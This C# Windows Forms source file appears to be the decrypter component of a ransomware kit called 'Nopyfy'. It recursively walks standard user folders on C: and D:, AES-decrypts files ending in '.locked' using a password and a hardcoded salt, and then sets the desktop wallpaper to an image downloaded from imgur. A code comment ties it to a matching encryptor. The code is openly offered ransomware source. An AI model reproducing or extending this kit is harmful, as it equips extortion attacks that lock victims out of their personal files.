﻿
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Security.AccessControl;
using System.Net.Mail;



namespace Nopyfy_Decrypter
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 SystemParametersInfo(UInt32 action, UInt32 uParam, String vParam, UInt32 winIni);
        string userName = Environment.UserName;
        string userDir = "C:\\";
        string userDir1 = "D:\\";
        string backgroundImageUrl = "http://i.imgur.com/5Yuq9Qv.jpg"; //desktop background picture
        //write Encryption byte above 15 (same thing do in decrypter)
        byte nop_byte = 100;


        int decrypted = 0;

        public Form1()
        {
            InitializeComponent();
        }
        
        public byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;

            // Set your salt here, change it to meet your flavor:
            // The salt bytes must be at least 8 bytes.
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8, 9, 12, 15, nop_byte };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {

                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();


                }
            }

            return decryptedBytes;
        }
       
        public void DecryptFile(string file, string password)
        {

            byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

            File.WriteAllBytes(file, bytesDecrypted);
            string extension = System.IO.Path.GetExtension(file);
            string result = file.Substring(0, file.Length - extension.Length);
            System.IO.File.Move(file, result);

        }

        public void DecryptDirectory(string location)
        {
            try
            {
                label5.Visible = false;
                label3.Visible = false;
                string password = textBox1.Text;

                string[] files = Directory.GetFiles(location);
                string[] childDirectories = Directory.GetDirectories(location);
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (extension == ".locked")
                    {
                        DecryptFile(files[i], password);
                        decrypted = decrypted + 1;
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    DecryptDirectory(childDirectories[i]);
                }
                if (decrypted > 0)
                {
                    label3.Visible = true;
                }
                else
                {
                    label5.Visible = true;
                }
            }
            catch (Exception ex)
            {

            }

        }

        public void changeDesktop()
        {
            string backgroundImageName = userDir + userName + "\\beautyfull.jpg";
            SetWallpaperFromWeb(backgroundImageUrl, backgroundImageName);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string path_1 = "Users\\";
            label4.Visible = true;
            DialogResult result = MessageBox.Show("Decrypting files... Please wait while doesn't appears Files decrypted and don't worry if software doesn't answear.", "Press ok to start decryption process.", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
            if (result == DialogResult.Cancel)
            {
                Application.Exit();
            }
            else
            {
                decrypted = 0;
                string fullpath_1 = userDir + path_1 + userName + "\\Links";
                string fullpath_2 = userDir + path_1 + userName + "\\Contacts";
                string fullpath_3 = userDir + path_1 + userName + "\\Desktop";
                string fullpath_4 = userDir + path_1 + userName + "\\Documents";
                string fullpath_5 = userDir + path_1 + userName + "\\Downloads";
                string fullpath_6 = userDir + path_1 + userName + "\\Pictures";
                string fullpath_7 = userDir + path_1 + userName + "\\Music";
                string fullpath_8 = userDir + path_1 + userName + "\\OneDrive";
                string fullpath_9 = userDir + path_1 + userName + "\\Saved Games";
                string fullpath_10 = userDir + path_1 + userName + "\\Favorites";
                string fullpath_11 = userDir + path_1 + userName + "\\Searches";
                string fullpath_12 = userDir + path_1 + userName + "\\Videos";

                string fullpath_15 = userDir1 + path_1 + userName + "\\Links";
                string fullpath_16 = userDir1 + path_1 + userName + "\\Contacts";
                string fullpath_17 = userDir1 + path_1 + userName + "\\Desktop";
                string fullpath_18 = userDir1 + path_1 + userName + "\\Documents";
                string fullpath_19 = userDir1 + path_1 + userName + "\\Downloads";
                string fullpath_20 = userDir1 + path_1 + userName + "\\Pictures";
                string fullpath_21 = userDir1 + path_1 + userName + "\\Music";
                string fullpath_22 = userDir1 + path_1 + userName + "\\OneDrive";
                string fullpath_23 = userDir1 + path_1 + userName + "\\Saved Games";
                string fullpath_24 = userDir1 + path_1 + userName + "\\Favorites";
                string fullpath_25 = userDir1 + path_1 + userName + "\\Searches";
                string fullpath_26 = userDir1 + path_1 + userName + "\\Videos";
                DecryptDirectory(fullpath_1);
                DecryptDirectory(fullpath_2);
                DecryptDirectory(fullpath_3);
                DecryptDirectory(fullpath_4);
                DecryptDirectory(fullpath_5);
                DecryptDirectory(fullpath_6);
                DecryptDirectory(fullpath_7);
                DecryptDirectory(fullpath_8);
                DecryptDirectory(fullpath_9);
                DecryptDirectory(fullpath_10);
                DecryptDirectory(fullpath_11);
                DecryptDirectory(fullpath_12);

                DecryptDirectory(fullpath_15);
                DecryptDirectory(fullpath_16);
                DecryptDirectory(fullpath_17);
                DecryptDirectory(fullpath_18);
                DecryptDirectory(fullpath_19);
                DecryptDirectory(fullpath_20);
                DecryptDirectory(fullpath_21);
                DecryptDirectory(fullpath_22);
                DecryptDirectory(fullpath_23);
                DecryptDirectory(fullpath_24);
                DecryptDirectory(fullpath_25);
                DecryptDirectory(fullpath_26);

                if (decrypted > 0)
                {
                    changeDesktop();
                }

                label4.Visible = false;

            }
            
        }
        
        //Changes desktop background image
        public void SetWallpaper(String path)
        {
            SystemParametersInfo(0x14, 0, path, 0x01 | 0x02);
        }

        //Downloads image from web
        private void SetWallpaperFromWeb(string url, string path)
        {

            try
            {
                WebClient webClient = new WebClient();
                webClient.DownloadFile(new Uri(url), path);
                SetWallpaper(path);
            }
            catch { }


        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void label4_Click_1(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }
    }
}
